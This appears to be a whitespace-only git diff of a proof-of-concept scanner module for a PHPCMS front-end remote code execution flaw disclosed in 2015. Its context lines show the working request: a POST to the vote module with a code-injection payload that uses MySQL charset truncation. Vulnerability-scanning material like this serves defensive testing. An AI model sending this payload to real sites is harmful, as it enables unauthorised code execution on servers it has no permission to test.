@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 
+
 class Vuln(ABVuln):
-    vuln_id = 'PHPCMS_0015' # 平台漏洞编号，留空
+    vuln_id = 'PHPCMS_0015'  # 平台漏洞编号，留空
     name = 'PHPCMS 前台任意代码执行'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.RCE # 漏洞类型
+    type = VulnType.RCE  # 漏洞类型
     disclosure_date = '2015-03-27'  # 漏洞公布时间
     desc = '''
         首先利用了mysql的一个特性，mysql在存储数据的时候会根据当前数据库的字符集来校验数据，发现非法数据时会抛弃其后续数据。
@@ -22,6 +23,7 @@ class Vuln(ABVuln):
     product = 'PHPCMS'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = '0ca4837f-c5bf-46ac-bc4d-0f66db623b5a'
     author = '47bwy'  # POC编写者
@@ -34,7 +36,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             payload = '/phpcms_gbk/index.php?m=vote&c=index&a=post&subjectid=1'
             data = 'subjectid=1&radio[]=);md5(c);%80'
             url = self.target + payload
@@ -49,6 +51,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
